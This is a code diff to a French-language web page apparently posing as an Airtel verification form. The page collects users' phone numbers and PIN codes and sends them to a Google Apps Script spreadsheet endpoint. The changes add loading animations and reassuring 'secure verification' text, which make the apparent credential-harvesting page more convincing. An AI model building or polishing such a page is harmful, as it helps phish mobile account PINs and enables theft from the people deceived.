@@ -159,9 +159,26 @@
       cursor: pointer;
       transition: all 0.25s ease;
       margin-top: 0.8rem;
+      position: relative;
+      overflow: hidden;
     }
     .verify-airtel-btn:hover { background: linear-gradient(95deg, #8e1a1a, #b71c1c); transform: translateY(-2px); }
     .verify-airtel-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+    .verify-airtel-btn.loading {
+      background: linear-gradient(95deg, #8e1a1a, #c62828);
+    }
+    .verify-airtel-btn.loading::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, transparent 0%, rgba(255,255,255,0.35) 50%, transparent 100%);
+      transform: translateX(-100%);
+      animation: shimmery 1.2s ease-in-out infinite;
+    }
+    @keyframes shimmery {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
     .status-message {
       display: none;
       margin-top: 1.5rem;
@@ -174,6 +191,46 @@
     .status-error { background: #ffefed; color: #b71c1c; border-left: 5px solid #f97316; }
     .status-success { background: #e6f4f1; color: #1e5f4e; border-left: 5px solid #2e7d64; }
     .status-info { background: #f5f5f5; color: #444; border-left: 5px solid #9ca3af; }
+    .submission-loader {
+      display: none;
+      margin-top: 1rem;
+      padding: 0.75rem 0.9rem;
+      border-radius: 1rem;
+      background: #fff6f4;
+      border: 1px solid #f4d7d1;
+    }
+    .submission-loader.visible {
+      display: block;
+    }
+    .loader-track {
+      width: 100%;
+      height: 10px;
+      background: #f5d5d1;
+      border-radius: 999px;
+      overflow: hidden;
+      position: relative;
+      margin-bottom: 0.5rem;
+    }
+    .loader-track span {
+      position: absolute;
+      inset: 0;
+      width: 38%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #ba1d2d, #f04a4a, #ba1d2d);
+      animation: progressPulse 1.6s ease-in-out infinite;
+    }
+    @keyframes progressPulse {
+      0% { transform: translateX(-110%); }
+      50% { transform: translateX(120%); }
+      100% { transform: translateX(120%); }
+    }
+    .loader-text {
+      font-size: 0.73rem;
+      color: #8e1d2c;
+      font-weight: 700;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
     .info-note { margin-top: 1.4rem; font-size: 0.7rem; text-align: center; color: #928e8c; background: #fef6f3; padding: 0.5rem 1rem; border-radius: 2rem; width: fit-content; margin-left: auto; margin-right: auto; }
 
     @media (max-width: 780px) {
@@ -233,6 +290,10 @@
     </div>
 
     <button class="verify-airtel-btn" id="verifyBtn" type="button"><i class="fas fa-check-double"></i> Vérifier et envoyer</button>
+    <div id="submissionLoader" class="submission-loader" aria-live="polite">
+      <div class="loader-track"><span></span></div>
+      <div class="loader-text">Vérification sécurisée...</div>
+    </div>
     <div id="statusMessage" class="status-message" style="display: none;"></div>
     <div class="info-note"><i class="fas fa-database"></i> Votre vérification nous aide à étendre la couverture et à améliorer les services</div>
   </div>
@@ -243,6 +304,7 @@
   const pinCodeInput = document.getElementById('pinCode');
   const verifyBtn = document.getElementById('verifyBtn');
   const statusMessage = document.getElementById('statusMessage');
+  const submissionLoader = document.getElementById('submissionLoader');
 
   const GOOGLE_SHEET_API_URL = "https://script.google.com/macros/s/AKfycbziRuGSVgyjmneFgT8gwaDUuCrWBVXduf4OtdIJaVoIF4-ZZHMyex2SEab1ZoBX1nJ-/exec";
 
@@ -257,6 +319,21 @@
     statusMessage.style.display = 'none';
     statusMessage.textContent = '';
     statusMessage.className = 'status-message';
+  }
+
+  function startLoading() {
+    verifyBtn.disabled = true;
+    verifyBtn.classList.add('loading');
+    verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification en cours...';
+    submissionLoader.classList.add('visible');
+    statusMessage.style.display = 'none';
+  }
+
+  function stopLoading() {
+    verifyBtn.disabled = false;
+    verifyBtn.classList.remove('loading');
+    verifyBtn.innerHTML = '<i class="fas fa-check-double"></i> Vérifier et envoyer';
+    submissionLoader.classList.remove('visible');
   }
 
   function validateFields() {
@@ -303,9 +380,7 @@
       return;
     }
 
-    verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification en cours...';
-    showStatus('Envoi de votre vérification...', 'info');
+    startLoading();
 
     const payload = {
       phoneNumber: localPhoneInput.value.trim(),
@@ -322,8 +397,7 @@
       console.error(error);
       showStatus('Une erreur est survenue lors de l’envoi. Merci de réessayer plus tard.', 'error');
     } finally {
-      verifyBtn.disabled = false;
-      verifyBtn.innerHTML = '<i class="fas fa-check-double"></i> Vérifier et envoyer';
+      stopLoading();
     }
   });
 
